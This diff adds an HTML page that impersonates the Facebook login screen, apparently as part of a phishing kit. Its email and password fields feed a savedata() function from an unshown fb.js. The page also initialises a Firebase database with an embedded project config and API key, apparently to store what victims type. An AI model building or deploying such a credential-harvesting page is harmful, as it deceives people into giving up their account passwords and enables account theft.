@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="fb.css">
+    <script src="https://www.gstatic.com/firebasejs/7.19.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.19.0/firebase-database.js"></script>
+    <script>
+        var firebaseConfig = {
+          apiKey: "AIzaSyCf3ESX1WQYVXjFWEaGRr7yp701It28n9A",
+          authDomain: "quiz-9374f.firebaseapp.com",
+          databaseURL: "https://quiz-9374f.firebaseio.com",
+          projectId: "quiz-9374f",
+          storageBucket: "quiz-9374f.appspot.com",
+          messagingSenderId: "1093569632027",
+          appId: "1:1093569632027:web:9ef28399b4e787450f25be",
+          measurementId: "G-FBZXXG1GBT"
+        };
+        firebase.initializeApp(firebaseConfig);
+    </script>    
+</head>
+
+<body>
+
+    <div class="wrapper">
+        <div class="main">
+            <div class="name">
+                <center> facebook </center>
+            </div>
+            <div class="in">
+                <center>
+                    <h3>Log in to Facebook</h3>
+                    <div class="inputs"> 
+                        <input class="place" id="name"  type="text" placeholder="Email Address or Phone Number"><br>
+                        <input class="place" id="pass" type="text" placeholder="Password"><br>
+                        <a href="#" onclick="savedata()" class="btn">Log in</a>
+                    </div>
+                </center>
+            </div>
+        </div>
+    </div>
+    
+
+    <script src="fb.js"></script>
+</body>
+</html>
